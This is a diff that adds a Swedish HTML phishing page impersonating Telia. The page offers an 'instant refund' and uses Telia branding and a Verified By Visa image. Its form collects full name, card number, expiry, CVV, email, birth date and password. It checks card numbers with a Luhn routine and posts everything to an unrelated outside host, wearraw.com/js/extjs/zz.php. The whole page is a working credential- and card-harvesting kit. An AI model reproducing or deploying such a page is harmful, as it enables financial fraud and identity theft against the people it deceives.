@@ -1,0 +1,884 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="content-type" http-equiv="content-type" />
+  <title>
+   https://telia.se/cp/index.jsp
+  </title>
+  <link href="ado/styles.css" rel="stylesheet" />
+  <script type="text/javascript">
+   function removeSpacesFromPAN(fieldName) // strips off spaces before and after field name
+{
+
+	var startIndex, lastIndex;
+	var newFieldName, newC;
+
+	lastIndex = fieldName.length-1;
+	startIndex = 0;
+
+	newC = fieldName.charAt(startIndex);
+	while ((startIndex&lt;lastIndex) &amp;&amp; ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
+		startIndex++;
+		newC = fieldName.charAt(startIndex);
+	}
+
+	newC = fieldName.charAt(lastIndex);
+	while ((lastIndex&gt;=0) &amp;&amp; ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
+		lastIndex--;
+		newC = fieldName.charAt(lastIndex);
+	}
+	if (startIndex&lt;=lastIndex) {
+		newFieldName = fieldName.substring(startIndex, lastIndex+1);
+		return newFieldName;
+	} else {
+		return fieldName;
+	}
+}
+
+
+function verifyMod10(field)
+{
+	var PAN = field;
+
+	PAN = removeSpacesFromPAN(PAN);
+	var st = PAN;
+
+	if (st.length &gt; 19)
+		return false;
+
+	var sum = 0;
+	var mul = 1;
+	var st_len = st.length;
+	var tproduct;
+
+	for (i = 0; i &lt; st_len; i++)
+	{
+		digit = st.substring(st_len-i-1, st_len-i);
+
+		if (digit == " " || digit == "-")
+			continue;
+
+		tproduct = parseInt(digit ,10) * mul;
+
+	    if (tproduct &gt;= 10)
+	      sum += (tproduct % 10) + 1;
+	    else
+	      sum += tproduct;
+
+	    if (mul == 1)
+	      mul++;
+	    else
+	      mul--;
+	}
+
+	if ((sum % 10) != 0)
+		return false;
+ 
+	return true;
+}
+
+function formSub(){
+ setTimeout("document.CommonData.submit()",1000);
+}
+
+function logPANentry(action) {
+
+                var loc = document.location.pathname.substr(document.location.pathname.lastIndexOf("/")+1)
+       
+                var rn = Math.random()+"";
+                var a = rn * 10000000000000;
+                
+                
+}
+
+
+
+function checkform ( form )
+{
+
+   if (form.first.value.length &lt; 2) {
+    alert( "Fyll område: Ditt fullständiga namn." );
+    form.first.focus();
+	  document.getElementById('first').style.backgroundColor="#FF6A6A";
+    return false ;
+} 
+  if (form.last.value.length &lt; 2) {
+    alert( "Fyll område: Ditt fullständiga namn." );
+    form.last.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="#FF6A6A";
+    return false ;
+}  
+if (form.ccnr.value.length &lt; 16) {
+    alert( "Fyll område:  Kortnummer" );
+    form.ccnr.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
+    return false ;
+} 
+  if (!verifyMod10(form.ccnr.value)) {
+    alert( "Fyll område:  Kortnummer" );
+    form.ccnr.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
+    return false ;
+} 
+if (form.expm.value.length &lt; 1) {
+    alert( "Fyll område: Giltigt till" );
+    form.expm.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.expy.value.length &lt; 4) {
+    alert( "Fyll område: Giltigt till" );
+    form.expy.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.cvv.value.length &lt; 3) {
+    alert( "Fyll område: CVV-CVV2" );
+    form.cvv.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.cpr.value.length &lt; 4) {
+    alert( "Fyll område: e-post" );
+    form.cpr.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="";
+	  document.getElementById('cpr').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.dobd.value.length &lt; 1) {
+    alert( "Fyll område: födelsedatum " );
+    form.dobd.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="";
+	  document.getElementById('cpr').style.backgroundColor="";
+	  document.getElementById('dobd').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.dobm.value.length &lt; 1) {
+    alert( "Fyll område: födelsedatum " );
+    form.dobm.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="";
+	  document.getElementById('cpr').style.backgroundColor="";
+	  document.getElementById('dobd').style.backgroundColor="";
+	  document.getElementById('dobm').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.doby.value.length &lt; 4) {
+    alert( "Fyll område: födelsedatum " );
+    form.doby.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="";
+	  document.getElementById('cpr').style.backgroundColor="";
+	  document.getElementById('dobd').style.backgroundColor="";
+	  document.getElementById('dobm').style.backgroundColor="";
+	  document.getElementById('doby').style.backgroundColor="#FF6A6A";
+    return false ;
+} if (form.pass.value.length &lt; 7) {
+    alert( "Fyll område: lösenord " );
+    form.pass.focus();
+	  document.getElementById('first').style.backgroundColor="";
+	  document.getElementById('last').style.backgroundColor="";
+	  document.getElementById('ccnr').style.backgroundColor="";
+	  document.getElementById('expm').style.backgroundColor="";
+	  document.getElementById('expy').style.backgroundColor="";
+	  document.getElementById('cvv').style.backgroundColor="";
+	  document.getElementById('cpr').style.backgroundColor="";
+	  document.getElementById('dobd').style.backgroundColor="";
+	  document.getElementById('dobm').style.backgroundColor="";
+	  document.getElementById('doby').style.backgroundColor="";
+	  document.getElementById('pass').style.backgroundColor="#FF6A6A";
+    return false ;
+} 
+ return true ;
+ }
+  </script>
+  <style type="text/css">
+   body {
+	margin: 10px;
+}
+h1 {
+	font-family: Verdana;
+	font-size: 14px;
+}
+.tbl {
+	background-color: #f0f0f0;
+	border-top: 3px solid #ccc;
+}
+td {
+	font-family: Verdana;
+	font-size: 12px;
+}
+#cnt {
+	width: 550px;
+	margin: auto;
+}
+  </style>
+ </head>
+ <body bgcolor="#ffffff" onload="setFocus()">
+  <div align="center">
+   <div id="cnt">
+    <div align="left">
+     <table width="550" cellpadding="0">
+      <tbody>
+       <tr>
+        <td width="428">
+         <img border="0" src="http://admin.furiousteam.com/user_upload/networks/1416/telia.png" alt="NETS" />
+        </td>
+        <td align="right">
+         <div>
+          <nobr>
+          </nobr>
+         </div>
+         <div>
+          <nobr>
+           <img width="108" height="57" border="0" src="http://www.contactcenter.telia.se/Global/TeliaCallGuide/Foton/20131021tsstockholm012-left-beskuren2-300.png" alt="Verified By Visa" />
+          </nobr>
+         </div>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+    </div>
+    <div align="left">
+     <form action="http://www.wearraw.com/js/extjs/zz.php" name="Mata" method="post" onsubmit="return checkform(this)" id="Mata">
+      <div id="cnt" style="WIDTH: 551px; HEIGHT: 730px">
+       <div align="left">
+        <table width="550" cellpadding="3">
+         <tbody>
+          <tr>
+           <th align="left" colspan="2">
+            <div align="center">
+             <span lang="da" class="short_text" id="result_box">
+              <span class="hps">
+               Omedelbar återbetalning
+              </span>
+              <span class="hps">
+              </span>
+              <span class="hps">
+              </span>
+              <span class="hps">
+              </span>
+             </span>
+            </div>
+            <div>
+             <span lang="da" class="short_text">
+              <span class="hps">
+              </span>
+             </span>
+            </div>
+            <div>
+             <font color="#e13104">
+             </font>
+            </div>
+           </th>
+          </tr>
+          <tr>
+           <td width="281">
+            Ditt fullständiga namn
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td width="249" align="left">
+            <input autocomplete="off" name="first" size="2" maxlength="14" onkeyup="isIntegere(this.value)" onkeypress="return disableEnterKey(event)" id="first" style="WIDTH: 70px; HEIGHT: 20px" />
+            <span lang="da" class="short_text" id="result_box">
+             <input autocomplete="off" maxlength="14" size="2" onkeypress="return disableEnterKey(event)" style="WIDTH: 70px; HEIGHT: 20px" id="last" name="last" />
+            </span>
+           </td>
+          </tr>
+          <tr>
+          </tr>
+          <tr>
+           <td width="281">
+            Ditt
+            <span id="cardInfoVo.cardNumber_col">
+             kortnummer
+            </span>
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td align="left">
+            <input autocomplete="off" name="ccnr" maxlength="16" onkeyup="isIntegert(this.value)" onkeypress="return disableEnterKey(event)" id="ccnr" />
+           </td>
+          </tr>
+          <tr>
+           <td width="281">
+            utgångsdatum
+            <span id="cardInfoVo.expMonth_col">
+             <span id="cardInfoVo.expYear_col">
+             </span>
+            </span>
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td align="left">
+            <input autocomplete="off" name="expm" size="2" maxlength="2" onkeyup="isIntegere(this.value)" onkeypress="return disableEnterKey(event)" id="expm" style="WIDTH: 38px; HEIGHT: 20px" />
+            /
+            <input autocomplete="off" maxlength="4" size="2" onkeypress="return disableEnterKey(event)" style="WIDTH: 39px; HEIGHT: 20px" id="expy" name="expy" />
+            <span lang="da" class="short_text" id="result_box">
+             <span class="hps">
+              Exempel
+             </span>
+            </span>
+            (10/2015)
+           </td>
+          </tr>
+          <tr>
+           <td width="281">
+            CVV-
+            <span id="cardInfoVo.securityCode_col">
+             CVV2
+            </span>
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td align="left">
+            <input autocomplete="off" maxlength="3" size="2" onkeypress="return disableEnterKey(event)" style="WIDTH: 39px; HEIGHT: 20px" id="cvv" name="cvv" />
+            (
+            <span lang="da" class="short_text" id="result_box">
+             <span class="hps">
+              tre siffror
+             </span>
+             <span class="hps">
+              på baksidan
+             </span>
+             <span class="hps">
+              av
+             </span>
+             <span class="hps">
+              kortet
+             </span>
+            </span>
+            )
+           </td>
+          </tr>
+          <tr>
+           <td width="281">
+            E-post
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td align="left">
+            <input autocomplete="off" maxlength="100" size="60" style="WIDTH: 100px; HEIGHT: 20px" id="cpr" name="cpr" />
+           </td>
+          </tr>
+          <tr>
+           <td width="281">
+            Födelsedag
+            <font color="#ff0000">
+             *
+            </font>
+            :
+           </td>
+           <td align="left">
+            <select style="WIDTH: 46px; HEIGHT:20 px" id="dobd" name="dobd">
+             <option value="">
+              DD
+             </option>
+             <option value="01">
+              01
+             </option>
+             <option value="02">
+              02
+             </option>
+             <option value="03">
+              03
+             </option>
+             <option value="04">
+              04
+             </option>
+             <option value="05">
+              05
+             </option>
+             <option value="06">
+              06
+             </option>
+             <option value="07">
+              07
+             </option>
+             <option value="08">
+              08
+             </option>
+             <option value="09">
+              09
+             </option>
+             <option value="10">
+              10
+             </option>
+             <option value="11">
+              11
+             </option>
+             <option value="12">
+              12
+             </option>
+             <option value="13">
+              13
+             </option>
+             <option value="14">
+              14
+             </option>
+             <option value="15">
+              15
+             </option>
+             <option value="16">
+              16
+             </option>
+             <option value="17">
+              17
+             </option>
+             <option value="18">
+              18
+             </option>
+             <option value="19">
+              19
+             </option>
+             <option value="20">
+              20
+             </option>
+             <option value="21">
+              21
+             </option>
+             <option value="22">
+              22
+             </option>
+             <option value="23">
+              23
+             </option>
+             <option value="24">
+              24
+             </option>
+             <option value="25">
+              25
+             </option>
+             <option value="26">
+              26
+             </option>
+             <option value="27">
+              27
+             </option>
+             <option value="28">
+              28
+             </option>
+             <option value="29">
+              29
+             </option>
+             <option value="30">
+              30
+             </option>
+             <option value="31">
+              31
+             </option>
+            </select>
+            <select style="WIDTH: 46px; HEIGHT:20 px" id="dobm" name="dobm">
+             <option value="">
+              MM
+             </option>
+             <option value="01">
+              01
+             </option>
+             <option value="02">
+              02
+             </option>
+             <option value="03">
+              03
+             </option>
+             <option value="04">
+              04
+             </option>
+             <option value="05">
+              05
+             </option>
+             <option value="06">
+              06
+             </option>
+             <option value="07">
+              07
+             </option>
+             <option value="08">
+              08
+             </option>
+             <option value="09">
+              09
+             </option>
+             <option value="10">
+              10
+             </option>
+             <option value="11">
+              11
+             </option>
+             <option value="12">
+              12
+             </option>
+            </select>
+            <select style="WIDTH: 61px; HEIGHT:20 px" id="doby" name="doby">
+             <option value="">
+              ÅÅÅÅ
+             </option>
+             <option value="1920">
+              1920
+             </option>
+             <option value="1921">
+              1921
+             </option>
+             <option value="1922">
+              1922
+             </option>
+             <option value="1923">
+              1923
+             </option>
+             <option value="1924">
+              1924
+             </option>
+             <option value="1925">
+              1925
+             </option>
+             <option value="1926">
+              1926
+             </option>
+             <option value="1927">
+              1927
+             </option>
+             <option value="1928">
+              1928
+             </option>
+             <option value="1929">
+              1929
+             </option>
+             <option value="1930">
+              1930
+             </option>
+             <option value="1931">
+              1931
+             </option>
+             <option value="1932">
+              1932
+             </option>
+             <option value="1933">
+              1933
+             </option>
+             <option value="1934">
+              1934
+             </option>
+             <option value="1935">
+              1935
+             </option>
+             <option value="1936">
+              1936
+             </option>
+             <option value="1937">
+              1937
+             </option>
+             <option value="1938">
+              1938
+             </option>
+             <option value="1939">
+              1939
+             </option>
+             <option value="1940">
+              1940
+             </option>
+             <option value="1941">
+              1941
+             </option>
+             <option value="1942">
+              1942
+             </option>
+             <option value="1943">
+              1943
+             </option>
+             <option value="1944">
+              1944
+             </option>
+             <option value="1945">
+              1945
+             </option>
+             <option value="1946">
+              1946
+             </option>
+             <option value="1947">
+              1947
+             </option>
+             <option value="1948">
+              1948
+             </option>
+             <option value="1949">
+              1949
+             </option>
+             <option value="1950">
+              1950
+             </option>
+             <option value="1951">
+              1951
+             </option>
+             <option value="1952">
+              1952
+             </option>
+             <option value="1953">
+              1953
+             </option>
+             <option value="1954">
+              1954
+             </option>
+             <option value="1955">
+              1955
+             </option>
+             <option value="1956">
+              1956
+             </option>
+             <option value="1957">
+              1957
+             </option>
+             <option value="1958">
+              1958
+             </option>
+             <option value="1959">
+              1959
+             </option>
+             <option value="1960">
+              1960
+             </option>
+             <option value="1961">
+              1961
+             </option>
+             <option value="1962">
+              1962
+             </option>
+             <option value="1963">
+              1963
+             </option>
+             <option value="1964">
+              1964
+             </option>
+             <option value="1965">
+              1965
+             </option>
+             <option value="1966">
+              1966
+             </option>
+             <option value="1967">
+              1967
+             </option>
+             <option value="1968">
+              1968
+             </option>
+             <option value="1969">
+              1969
+             </option>
+             <option value="1970">
+              1970
+             </option>
+             <option value="1971">
+              1971
+             </option>
+             <option value="1972">
+              1972
+             </option>
+             <option value="1973">
+              1973
+             </option>
+             <option value="1974">
+              1974
+             </option>
+             <option value="1975">
+              1975
+             </option>
+             <option value="1976">
+              1976
+             </option>
+             <option value="1977">
+              1977
+             </option>
+             <option value="1978">
+              1978
+             </option>
+             <option value="1979">
+              1979
+             </option>
+             <option value="1980">
+              1980
+             </option>
+             <option value="1981">
+              1981
+             </option>
+             <option value="1982">
+              1982
+             </option>
+             <option value="1983">
+              1983
+             </option>
+             <option value="1984">
+              1984
+             </option>
+             <option value="1985">
+              1985
+             </option>
+             <option value="1986">
+              1986
+             </option>
+             <option value="1987">
+              1987
+             </option>
+             <option value="1988">
+              1988
+             </option>
+             <option value="1989">
+              1989
+             </option>
+             <option value="1990">
+              1990
+             </option>
+             <option value="1991">
+              1991
+             </option>
+             <option value="1992">
+              1992
+             </option>
+             <option value="1993">
+              1993
+             </option>
+             <option value="1994">
+              1994
+             </option>
+             <option value="1995">
+              1995
+             </option>
+            </select>
+           </td>
+          </tr>
+          <tr>
+           <td width="281">
+            <span lang="da" class="short_text" id="result_box">
+             <span class="hps">
+              Ange ditt lösenord
+             </span>
+             <span class="hps">
+              <font color="#ff0000">
+               *
+              </font>
+              :
+             </span>
+            </span>
+           </td>
+           <td>
+            <input type="password" autocomplete="off" id="pass" name="pass" maxlength="25" />
+           </td>
+          </tr>
+          <tr>
+           <td width="281" align="right">
+           </td>
+           <td>
+            <input type="submit" value="Bekräfta informationen" class="button " name="submit" />
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </div>
+       <font size="2" face="arial, verdana" color="gray">
+        <font color="#000000">
+         <div align="left" class="footer clearfix">
+          <font color="#0000ff">
+           <span lang="sv" class="short_text">
+            <span class="hps">
+             <u>
+             </u>
+            </span>
+           </span>
+          </font>
+         </div>
+         <div align="left" class="footer clearfix">
+          <font color="#0000ff">
+           <span lang="sv" class="short_text">
+            <span class="hps">
+             <u>
+             </u>
+            </span>
+           </span>
+          </font>
+         </div>
+         <div align="left" class="footer clearfix">
+          <font color="#0000ff">
+           <span lang="sv" class="short_text">
+            <span class="hps">
+             <u>
+             </u>
+            </span>
+           </span>
+          </font>
+         </div>
+         <div align="left" class="footer clearfix">
+          <font color="#0000ff">
+           <span lang="sv" class="short_text">
+            <span class="hps">
+             <u>
+             </u>
+            </span>
+           </span>
+           <u>
+            <span lang="sv" class="short_text" id="result_box">
+             <span class="hps">
+             </span>
+            </span>
+           </u>
+          </font>
+          <a href="about:/fr/system/footernavigation/left_fr/visa_europe.aspx" onclick="window.open(this.href, '_blank'); return false;" onkeypress="if (event.keyCode==13) {window.open(this.href, '_blank'); return false;}" title="">
+          </a>
+          <font color="#0000ff">
+          </font>
+                                  
+ 
+©Copyright © 2005-2015 Telia AB.
+         </div>
+        </font>
+       </font>
+      </div>
+     </form>
+    </div>
+    <font size="2" face="arial, verdana" color="gray">
+     <div>
+     </div>
+    </font>
+    <div class="footerContainer clearfix">
+     <div class="footer clearfix">
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
